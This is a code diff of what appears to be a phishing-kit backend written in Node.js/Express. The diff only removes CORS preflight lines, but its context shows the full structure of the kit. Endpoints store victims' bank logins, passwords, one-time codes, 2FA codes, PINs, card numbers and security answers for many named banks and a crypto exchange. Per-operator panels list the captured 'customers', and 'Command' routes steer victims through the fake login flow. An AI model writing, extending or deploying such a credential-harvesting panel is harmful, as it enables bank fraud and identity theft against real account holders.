@@ -34,7 +34,6 @@ panelConnection.connect((err) => {
 
 var bankName;
 
-app.options("/getips", cors());
 
 app.get("/getips", (req, res) => {
   fs.readFile("ips.txt", function (err, data) {
@@ -43,7 +42,6 @@ app.get("/getips", (req, res) => {
   });
 });
 
-app.options("/giveVisitor", cors());
 
 app.post("/giveVisitor", (req, res) => {
   ip = req.body.ip;
@@ -66,7 +64,6 @@ app.post("/giveVisitor", (req, res) => {
   );
 });
 
-app.options("/getVisitors", cors());
 
 app.get("/getVisitors/:owner", (req, res) => {
   owner = req.params.owner;
@@ -78,7 +75,6 @@ app.get("/getVisitors/:owner", (req, res) => {
   );
 });
 
-app.options("/getRespentesting123!", cors());
 
 app.get("/getRespentesting123!", (req, res) => {
   fs.readFile("results.txt", function (err, data) {
@@ -91,7 +87,6 @@ app.get("/getRespentesting123!", (req, res) => {
 //SANTS
 //SANTS
 
-app.options("/santsCustomers/:id/:owner/modal", cors());
 
 app.get("/santsCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -106,7 +101,6 @@ app.get("/santsCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/santsCustomers/:owner", cors());
 
 app.get("/santsCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -119,7 +113,6 @@ app.get("/santsCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/santsCommand", cors());
 
 app.post("/santsCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -146,7 +139,6 @@ app.post("/santsCommand", cors(), (req, res) => {
   }
 });
 
-app.options("/santsCustomers/:id/:owner", cors());
 
 app.get("/santsCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -163,7 +155,6 @@ app.get("/santsCustomers/:id/:owner", (req, res) => {
 
 let santsCount = 0;
 
-app.options("/santsSaveLogin", cors());
 
 app.post("/santsSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -197,7 +188,6 @@ app.post("/santsSaveLogin", cors(), (req, res) => {
   }
 });
 
-app.options("/santsSaveOtp", cors());
 
 app.post("/santsSaveOtp", cors(), (req, res) => {
   otp = req.body.otp;
@@ -213,7 +203,6 @@ app.post("/santsSaveOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/santsSaveLoginAgain", cors());
 
 app.post("/santsSaveLoginAgain", cors(), (req, res) => {
   username = req.body.username;
@@ -230,7 +219,6 @@ app.post("/santsSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-app.options("/santsSavePhone", cors());
 
 app.post("/santsSavePhone", cors(), (req, res) => {
   phone = req.body.phone;
@@ -246,7 +234,6 @@ app.post("/santsSavePhone", cors(), (req, res) => {
   });
 });
 
-app.options("/santsSaveCard", cors());
 
 app.post("/santsSaveCard", cors(), (req, res) => {
   ccname = req.body.ccname;
@@ -265,7 +252,6 @@ app.post("/santsSaveCard", cors(), (req, res) => {
   });
 });
 
-app.options("/santsDeleteentry/:id", cors());
 
 app.post("/santsDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -284,7 +270,6 @@ app.post("/santsDeleteentry/:id", cors(), (req, res) => {
 //REV
 //REV
 
-app.options("/revCustomers/:owner", cors());
 
 app.get("/revCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -297,7 +282,6 @@ app.get("/revCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/revCustomers/:id/:owner/modal", cors());
 
 app.get("/revCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -312,7 +296,6 @@ app.get("/revCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/revCommand", cors());
 
 app.post("/revCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -325,7 +308,6 @@ app.post("/revCommand", cors(), (req, res) => {
   });
 });
 
-app.options("/revCustomers/:id/:owner", cors());
 
 app.get("/revCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -340,7 +322,6 @@ app.get("/revCustomers/:id/:owner", (req, res) => {
   });
 });
 
-app.options("/revSaveLogin", cors());
 
 app.post("/revSaveLogin", cors(), (req, res) => {
   telephone = req.body.telephone;
@@ -357,7 +338,6 @@ app.post("/revSaveLogin", cors(), (req, res) => {
   });
 });
 
-app.options("/revSaveLoginAgain", cors());
 
 app.post("/revSaveLoginAgain", cors(), (req, res) => {
   telephone = req.body.telephone;
@@ -372,7 +352,6 @@ app.post("/revSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-app.options("/revSaveName", cors());
 
 app.post("/revSaveName", cors(), (req, res) => {
   fullname = req.body.fullname;
@@ -387,7 +366,6 @@ app.post("/revSaveName", cors(), (req, res) => {
   });
 });
 
-app.options("/revSaveCard", cors());
 
 app.post("/revSaveCard", cors(), (req, res) => {
   ccnum = req.body.ccnum;
@@ -404,7 +382,6 @@ app.post("/revSaveCard", cors(), (req, res) => {
   });
 });
 
-app.options("/revSavePin", cors());
 
 app.post("/revSavePin", cors(), (req, res) => {
   pin = req.body.pin;
@@ -419,7 +396,6 @@ app.post("/revSavePin", cors(), (req, res) => {
   });
 });
 
-app.options("/revSaveOtp", cors());
 
 app.post("/revSaveOtp", cors(), (req, res) => {
   otp = req.body.otp;
@@ -434,7 +410,6 @@ app.post("/revSaveOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/revDeleteentry/:id", cors());
 
 app.post("/revDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -453,7 +428,6 @@ app.post("/revDeleteentry/:id", cors(), (req, res) => {
 //KUCOIN
 //KUCOIN
 
-app.options("/kcCustomers/:owner", cors());
 
 app.get("/kcCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -466,7 +440,6 @@ app.get("/kcCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/kcCustomers/:id/:owner/modal", cors());
 
 app.get("/kcCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -481,7 +454,6 @@ app.get("/kcCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/kcCommand", cors());
 
 app.post("/kcCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -494,7 +466,6 @@ app.post("/kcCommand", cors(), (req, res) => {
   });
 });
 
-app.options("/kcCustomers/:id/:owner", cors());
 
 app.get("/kcCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -509,7 +480,6 @@ app.get("/kcCustomers/:id/:owner", (req, res) => {
   });
 });
 
-app.options("/kcSaveLogin", cors());
 
 app.post("/kcSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -527,7 +497,6 @@ app.post("/kcSaveLogin", cors(), (req, res) => {
   });
 });
 
-app.options("/kcSaveLoginAgain", cors());
 
 app.post("/kcSaveLoginAgain", cors(), (req, res) => {
   username = req.body.username;
@@ -543,7 +512,6 @@ app.post("/kcSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-app.options("/kcSaveTradingPass", cors());
 
 app.post("/kcSaveTradingPass", cors(), (req, res) => {
   tradingPass = req.body.tradingPass;
@@ -558,7 +526,6 @@ app.post("/kcSaveTradingPass", cors(), (req, res) => {
   });
 });
 
-app.options("/kcSave2FA", cors());
 
 app.post("/kcSave2FA", cors(), (req, res) => {
   twofactor = req.body.twofactor;
@@ -573,7 +540,6 @@ app.post("/kcSave2FA", cors(), (req, res) => {
   });
 });
 
-app.options("/kcSaveOTP", cors());
 
 app.post("/kcSaveOTP", cors(), (req, res) => {
   otp = req.body.otp;
@@ -588,7 +554,6 @@ app.post("/kcSaveOTP", cors(), (req, res) => {
   });
 });
 
-app.options("/kcSaveAll", cors());
 
 app.post("/kcSaveAll", cors(), (req, res) => {
   otp = req.body.otp;
@@ -605,7 +570,6 @@ app.post("/kcSaveAll", cors(), (req, res) => {
   });
 });
 
-app.options("/kcDeleteentry/:id", cors());
 
 app.post("/kcDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -624,7 +588,6 @@ app.post("/kcDeleteentry/:id", cors(), (req, res) => {
 //MICB
 //MICB
 
-app.options("/micbCustomers/:owner", cors());
 
 app.get("/micbCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -637,7 +600,6 @@ app.get("/micbCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/micbCustomers/:id/:owner/modal", cors());
 
 app.get("/micbCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -652,7 +614,6 @@ app.get("/micbCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/micbCommand", cors());
 
 app.post("/micbCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -665,7 +626,6 @@ app.post("/micbCommand", cors(), (req, res) => {
   });
 });
 
-app.options("/micbCustomers/:id/:owner", cors());
 
 app.get("/micbCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -680,7 +640,6 @@ app.get("/micbCustomers/:id/:owner", (req, res) => {
   });
 });
 
-app.options("/micbSaveLogin", cors());
 
 app.post("/micbSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -699,7 +658,6 @@ app.post("/micbSaveLogin", cors(), (req, res) => {
   });
 });
 
-app.options("/micbSaveLoginAgain", cors());
 
 app.post("/micbSaveLoginAgain", cors(), (req, res) => {
   username = req.body.username;
@@ -717,7 +675,6 @@ app.post("/micbSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-app.options("/micbSaveOtp", cors());
 
 app.post("/micbSaveOtp", cors(), (req, res) => {
   otp = req.body.otp;
@@ -733,7 +690,6 @@ app.post("/micbSaveOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/micbDeleteentry/:id", cors());
 
 app.post("/micbDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -752,7 +708,6 @@ app.post("/micbDeleteentry/:id", cors(), (req, res) => {
 //MQ
 //MQ
 
-app.options("/mqCustomers/:owner", cors());
 
 app.get("/mqCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -765,7 +720,6 @@ app.get("/mqCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/mqCustomers/:id/:owner/modal", cors());
 
 app.get("/mqCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -780,7 +734,6 @@ app.get("/mqCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/mqCommand", cors());
 
 app.post("/mqCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -793,7 +746,6 @@ app.post("/mqCommand", cors(), (req, res) => {
   });
 });
 
-app.options("/mqCustomers/:id/:owner", cors());
 
 app.get("/mqCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -810,7 +762,6 @@ app.get("/mqCustomers/:id/:owner", (req, res) => {
 
 let mqCount = 0;
 
-app.options("/mqSaveLogin", cors());
 
 app.post("/mqSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -844,7 +795,6 @@ app.post("/mqSaveLogin", cors(), (req, res) => {
   }
 });
 
-app.options("/mqSaveLoginAgain", cors());
 
 app.post("/mqSaveLoginAgain", cors(), (req, res) => {
   username = req.body.username;
@@ -861,7 +811,6 @@ app.post("/mqSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-app.options("/mqSaveOtp", cors());
 
 app.post("/mqSaveOtp", cors(), (req, res) => {
   otp = req.body.otp;
@@ -877,7 +826,6 @@ app.post("/mqSaveOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/mqDeleteentry/:id", cors());
 
 app.post("/mqDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -896,7 +844,6 @@ app.post("/mqDeleteentry/:id", cors(), (req, res) => {
 //BNP
 //BNP
 
-app.options("/bnpCustomers/:owner", cors());
 
 app.get("/bnpCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -909,7 +856,6 @@ app.get("/bnpCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/bnpCommand", cors());
 
 app.post("/bnpCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -923,7 +869,6 @@ app.post("/bnpCommand", cors(), (req, res) => {
   });
 });
 
-app.options("/bnpCustomers/:id/:owner/modal", cors());
 
 app.get("/bnpCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -938,7 +883,6 @@ app.get("/bnpCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/bnpCustomers/:id/:owner", cors());
 
 app.get("/bnpCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -953,7 +897,6 @@ app.get("/bnpCustomers/:id/:owner", (req, res) => {
   });
 });
 
-app.options("/bnpSaveLoginOtp", cors());
 
 app.post("/bnpSaveLoginOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -969,7 +912,6 @@ app.post("/bnpSaveLoginOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/bnpSaveIdentityOtp", cors());
 
 app.post("/bnpSaveIdentityOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -985,7 +927,6 @@ app.post("/bnpSaveIdentityOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/bnpSaveVerification", cors());
 
 app.post("/bnpSaveVerification", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1001,7 +942,6 @@ app.post("/bnpSaveVerification", cors(), (req, res) => {
   });
 });
 
-app.options("/bnpSaveLoginAgain", cors());
 
 app.post("/bnpSaveLoginAgain", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1018,7 +958,6 @@ app.post("/bnpSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-app.options("/bnpSavePhone", cors());
 
 app.post("/bnpSavePhone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1034,7 +973,6 @@ app.post("/bnpSavePhone", cors(), (req, res) => {
   });
 });
 
-app.options("/bnpSaveCard", cors());
 
 app.post("/bnpSaveCard", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1052,7 +990,6 @@ app.post("/bnpSaveCard", cors(), (req, res) => {
   });
 });
 
-app.options("/bnpSaveLogin", cors());
 
 app.post("/bnpSaveLogin", cors(), (req, res) => {
   clientCode = req.body.clientCode;
@@ -1069,7 +1006,6 @@ app.post("/bnpSaveLogin", cors(), (req, res) => {
   });
 });
 
-app.options("/bnpDeleteentry/:id", cors());
 
 app.post("/bnpDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -1087,7 +1023,6 @@ app.post("/bnpDeleteentry/:id", cors(), (req, res) => {
 //DBS
 //DBS
 
-app.options("/dbsCustomers/:id", cors());
 
 app.get("/dbsCustomers/:id", (req, res) => {
   uniqueid = req.params.id;
@@ -1101,7 +1036,6 @@ app.get("/dbsCustomers/:id", (req, res) => {
   });
 });
 
-app.options("/dbsCustomers", cors());
 
 app.get("/dbsCustomers", (req, res) => {
   panelConnection.query(`SELECT * FROM customers`, (err, rows, fields) => {
@@ -1110,7 +1044,6 @@ app.get("/dbsCustomers", (req, res) => {
   });
 });
 
-app.options("/dbsCommand", cors());
 
 app.post("/dbsCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1137,7 +1070,6 @@ app.post("/dbsCommand", cors(), (req, res) => {
   }
 });
 
-app.options("/dbsDeleteentry/:id", cors());
 
 app.post("/dbsDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -1151,7 +1083,6 @@ app.post("/dbsDeleteentry/:id", cors(), (req, res) => {
   });
 });
 
-app.options("/dbsSaveLogin", cors());
 
 app.post("/dbsSaveLogin", cors(), (req, res) => {
   pin = req.body.pin;
@@ -1168,7 +1099,6 @@ app.post("/dbsSaveLogin", cors(), (req, res) => {
   });
 });
 
-app.options("/dbsSaveLoginAgain", cors());
 
 app.post("/dbsSaveLoginAgain", cors(), (req, res) => {
   pin = req.body.pin;
@@ -1184,7 +1114,6 @@ app.post("/dbsSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-app.options("/dbsPaymentOtp", cors());
 
 app.post("/dbsPaymentOtp", cors(), (req, res) => {
   paymentOtp = req.body.paymentOtp;
@@ -1199,7 +1128,6 @@ app.post("/dbsPaymentOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/dbsSavePhone", cors());
 
 app.post("/dbsSavePhone", cors(), (req, res) => {
   telephone = req.body.telephone;
@@ -1214,7 +1142,6 @@ app.post("/dbsSavePhone", cors(), (req, res) => {
   });
 });
 
-app.options("/dbsSaveEmail", cors());
 
 app.post("/dbsSaveEmail", cors(), (req, res) => {
   email = req.body.email;
@@ -1229,7 +1156,6 @@ app.post("/dbsSaveEmail", cors(), (req, res) => {
   });
 });
 
-app.options("/dbsSavePhoneOtp", cors());
 
 app.post("/dbsSavePhoneOtp", cors(), (req, res) => {
   otp = req.body.otp;
@@ -1244,7 +1170,6 @@ app.post("/dbsSavePhoneOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/dbsSaveEmailOtp", cors());
 
 app.post("/dbsSaveEmailOtp", cors(), (req, res) => {
   otp = req.body.otp;
@@ -1259,7 +1184,6 @@ app.post("/dbsSaveEmailOtp", cors(), (req, res) => {
   });
 });
 
-app.options("/dbsSaveCC", cors());
 
 app.post("/dbsSaveCC", cors(), (req, res) => {
   ccnum = req.body.ccnum;
@@ -1280,7 +1204,6 @@ app.post("/dbsSaveCC", cors(), (req, res) => {
 //ANZ
 //ANZ
 
-app.options("/anzCustomers/:owner", cors());
 
 app.get("/anzCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -1294,7 +1217,6 @@ app.get("/anzCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/anzCommand", cors());
 
 app.post("/anzCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1319,7 +1241,6 @@ app.post("/anzCommand", cors(), (req, res) => {
   }
 });
 
-app.options("/anzCustomers/:id/:owner/modal", cors());
 
 app.get("/anzCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -1334,7 +1255,6 @@ app.get("/anzCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/anzCustomers/:id/:owner", cors());
 
 app.get("/anzCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -1349,7 +1269,6 @@ app.get("/anzCustomers/:id/:owner", (req, res) => {
   });
 });
 
-app.options("/anzSaveLogin", cors());
 
 app.post("/anzSaveLogin", cors(), (req, res) => {
   customerId = req.body.customerId;
@@ -1367,7 +1286,6 @@ app.post("/anzSaveLogin", cors(), (req, res) => {
   });
 });
 
-app.options("/anzSaveTelephone", cors());
 
 app.post("/anzSaveTelephone", cors(), (req, res) => {
   telephone = req.body.telephone;
@@ -1383,7 +1301,6 @@ app.post("/anzSaveTelephone", cors(), (req, res) => {
   });
 });
 
-app.options("/anzSaveLoginAgain", cors());
 
 app.post("/anzSaveLoginAgain", cors(), (req, res) => {
   customerId = req.body.customerId;
@@ -1400,7 +1317,6 @@ app.post("/anzSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-app.options("/anzSaveOTP", cors());
 
 app.post("/anzSaveOTP", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1416,7 +1332,6 @@ app.post("/anzSaveOTP", cors(), (req, res) => {
   });
 });
 
-app.options("/anzSaveAnswers", cors());
 
 app.post("/anzSaveAnswers", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1432,7 +1347,6 @@ app.post("/anzSaveAnswers", cors(), (req, res) => {
   });
 });
 
-app.options("/anzDeleteentry/:id", cors());
 
 app.post("/anzDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -1450,7 +1364,6 @@ app.post("/anzDeleteentry/:id", cors(), (req, res) => {
 //BL
 //BL
 
-app.options("/banklineCustomers/:id", cors());
 
 app.get("/banklineCustomers/:id", (req, res) => {
   uniqueid = req.params.id;
@@ -1464,7 +1377,6 @@ app.get("/banklineCustomers/:id", (req, res) => {
   });
 });
 
-app.options("/banklineCustomers", cors());
 
 app.get("/banklineCustomers", (req, res) => {
   blConnection.query(`SELECT * FROM customers`, (err, rows, fields) => {
@@ -1473,7 +1385,6 @@ app.get("/banklineCustomers", (req, res) => {
   });
 });
 
-app.options("/banklineSaveLogin", cors());
 
 app.post("/banklineSaveLogin", cors(), (req, res) => {
   customerId = req.body.customerId;
@@ -1490,7 +1401,6 @@ app.post("/banklineSaveLogin", cors(), (req, res) => {
   });
 });
 
-app.options("/banklineSavePayment", cors());
 
 app.post("/banklineSavePayment", cors(), (req, res) => {
   paymentCode = req.body.paymentCode;
@@ -1505,7 +1415,6 @@ app.post("/banklineSavePayment", cors(), (req, res) => {
   });
 });
 
-app.options("/banklineSaveAuth", cors());
 
 app.post("/banklineSaveAuth", cors(), (req, res) => {
   responseCode = req.body.responseCode;
@@ -1521,7 +1430,6 @@ app.post("/banklineSaveAuth", cors(), (req, res) => {
   });
 });
 
-app.options("/banklineCommand", cors());
 
 app.post("/banklineCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1569,7 +1477,6 @@ app.post("/banklineCommand", cors(), (req, res) => {
   }
 });
 
-app.options("/banklineDeleteentry/:id", cors());
 
 app.post("/banklineDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -1583,7 +1490,6 @@ app.post("/banklineDeleteentry/:id", cors(), (req, res) => {
   });
 });
 
-app.options("/banklineSaveLoginAgain", cors());
 
 app.post("/banklineSaveLoginAgain", cors(), (req, res) => {
   customerId = req.body.customerId;
@@ -1603,7 +1509,6 @@ app.post("/banklineSaveLoginAgain", cors(), (req, res) => {
 //WP
 //WP
 
-app.options("/wpCustomers/:id/:owner/modal", cors());
 
 app.get("/wpCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -1618,7 +1523,6 @@ app.get("/wpCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/wpCustomers/:owner", cors());
 
 app.get("/wpCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -1631,7 +1535,6 @@ app.get("/wpCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/wpCommand", cors());
 
 app.post("/wpCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1644,7 +1547,6 @@ app.post("/wpCommand", cors(), (req, res) => {
   });
 });
 
-app.options("/wpCustomers/:id/:owner", cors());
 
 app.get("/wpCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -1659,7 +1561,6 @@ app.get("/wpCustomers/:id/:owner", (req, res) => {
   });
 });
 
-app.options("/wpSaveLogin", cors());
 
 app.post("/wpSaveLogin", cors(), (req, res) => {
   customerId = req.body.customerId;
@@ -1677,7 +1578,6 @@ app.post("/wpSaveLogin", cors(), (req, res) => {
   });
 });
 
-app.options("/wpSaveLoginAgain", cors());
 
 app.post("/wpSaveLoginAgain", cors(), (req, res) => {
   customerId = req.body.customerId;
@@ -1694,7 +1594,6 @@ app.post("/wpSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-app.options("/wpSaveOTP", cors());
 
 app.post("/wpSaveOTP", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1710,7 +1609,6 @@ app.post("/wpSaveOTP", cors(), (req, res) => {
   });
 });
 
-app.options("/wpSaveTelephone", cors());
 
 app.post("/wpSaveTelephone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1726,7 +1624,6 @@ app.post("/wpSaveTelephone", cors(), (req, res) => {
   });
 });
 
-app.options("/wpDeleteentry/:id", cors());
 
 app.post("/wpDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -1745,7 +1642,6 @@ app.post("/wpDeleteentry/:id", cors(), (req, res) => {
 //COMMBANK
 //COMMBANK
 
-app.options("/cbCustomers/:owner", cors());
 
 app.get("/cbCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -1758,7 +1654,6 @@ app.get("/cbCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/cbCommand", cors());
 
 app.post("/cbCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1771,7 +1666,6 @@ app.post("/cbCommand", cors(), (req, res) => {
   });
 });
 
-app.options("/cbCustomers/:id/:owner", cors());
 
 app.get("/cbCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -1797,7 +1691,6 @@ app.get("/cbCustomers/:id/:owner", (req, res) => {
   });
 });
 
-app.options("/cbCustomers/:id/:owner/modal", cors());
 
 app.get("/cbCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -1812,7 +1705,6 @@ app.get("/cbCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/cbSaveLogin", cors());
 
 app.post("/cbSaveLogin", cors(), (req, res) => {
   clientNumber = req.body.clientNumber;
@@ -1831,7 +1723,6 @@ app.post("/cbSaveLogin", cors(), (req, res) => {
   });
 });
 
-app.options("/cbSaveLoginAgain", cors());
 
 app.post("/cbSaveLoginAgain", cors(), (req, res) => {
   customerId = req.body.customerId;
@@ -1848,7 +1739,6 @@ app.post("/cbSaveLoginAgain", cors(), (req, res) => {
   });
 });
 
-app.options("/cbSaveOTP", cors());
 
 app.post("/cbSaveOTP", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1865,7 +1755,6 @@ app.post("/cbSaveOTP", cors(), (req, res) => {
   });
 });
 
-app.options("/cbSaveCard", cors());
 
 app.post("/cbSaveCard", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1884,7 +1773,6 @@ app.post("/cbSaveCard", cors(), (req, res) => {
   });
 });
 
-app.options("/cbSavePhone", cors());
 
 app.post("/cbSavePhone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1901,7 +1789,6 @@ app.post("/cbSavePhone", cors(), (req, res) => {
   });
 });
 
-app.options("/cbDeleteentry/:id", cors());
 
 app.post("/cbDeleteentry/:id", cors(), (req, res) => {
   uniqueid = req.params.id;
@@ -1920,7 +1807,6 @@ app.post("/cbDeleteentry/:id", cors(), (req, res) => {
 //ZENCOM
 //ZENCOM
 
-app.options("/zcCustomers/:owner", cors());
 
 app.get("/zcCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -1933,7 +1819,6 @@ app.get("/zcCustomers/:owner", (req, res) => {
   res.send(result);
 });
 
-app.options("/zcCommand", cors());
 
 app.post("/zcCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1946,7 +1831,6 @@ app.post("/zcCommand", cors(), (req, res) => {
   }
 });
 
-app.options("/zcCustomers/:id/:owner", cors());
 
 app.get("/zcCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -1961,7 +1845,6 @@ app.get("/zcCustomers/:id/:owner", (req, res) => {
   res.send(result);
 });
 
-app.options("/zcSavePin", cors());
 
 app.post("/zcSavePin", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1977,7 +1860,6 @@ app.post("/zcSavePin", cors(), (req, res) => {
   res.send("Completed");
 });
 
-app.options("/zcSaveLoginAgain", cors());
 
 app.post("/zcSaveLoginAgain", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -1993,7 +1875,6 @@ app.post("/zcSaveLoginAgain", cors(), (req, res) => {
   res.send("Completed");
 });
 
-app.options("/zcSaveOtp", cors());
 
 app.post("/zcSaveOtp", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2009,7 +1890,6 @@ app.post("/zcSaveOtp", cors(), (req, res) => {
   res.send("Completed");
 });
 
-app.options("/zcSaveLogin", cors());
 
 app.post("/zcSaveLogin", cors(), (req, res) => {
   telephone = req.body.telephone;
@@ -2032,7 +1912,6 @@ app.post("/zcSaveLogin", cors(), (req, res) => {
 //RBC
 //RBC
 
-app.options("/rbcCustomers/:id/:owner/modal", cors());
 
 app.get("/rbcCustomers/:id/:owner/modal", (req, res) => {
   uniqueid = req.params.id;
@@ -2047,7 +1926,6 @@ app.get("/rbcCustomers/:id/:owner/modal", (req, res) => {
   });
 });
 
-app.options("/rbcCustomers/:owner", cors());
 
 app.get("/rbcCustomers/:owner", (req, res) => {
   owner = req.params.owner;
@@ -2060,7 +1938,6 @@ app.get("/rbcCustomers/:owner", (req, res) => {
   });
 });
 
-app.options("/rbcCommand", cors());
 
 app.post("/rbcCommand", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2083,7 +1960,6 @@ app.post("/rbcCommand", cors(), (req, res) => {
   }
 });
 
-app.options("/rbcCustomers/:id/:owner", cors());
 
 app.get("/rbcCustomers/:id/:owner", (req, res) => {
   uniqueid = req.params.id;
@@ -2098,7 +1974,6 @@ app.get("/rbcCustomers/:id/:owner", (req, res) => {
   });
 });
 
-app.options("/rbcSaveLogin", cors());
 
 app.post("/rbcSaveLogin", cors(), (req, res) => {
   username = req.body.username;
@@ -2116,7 +1991,6 @@ app.post("/rbcSaveLogin", cors(), (req, res) => {
   });
 });
 
-app.options("/rbcSaveTelephone", cors());
 
 app.post("/rbcSaveTelephone", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2131,7 +2005,6 @@ app.post("/rbcSaveTelephone", cors(), (req, res) => {
   });
 });
 
-app.options("/rbcSaveQuestion", cors());
 
 app.post("/rbcSaveQuestion", cors(), (req, res) => {
   uniqueid = req.body.uniqueid;
@@ -2146,7 +2019,6 @@ app.post("/rbcSaveQuestion", cors(), (req, res) => {
   });
 });
 
-app.options("/rbcSaveOtp", cors());
 
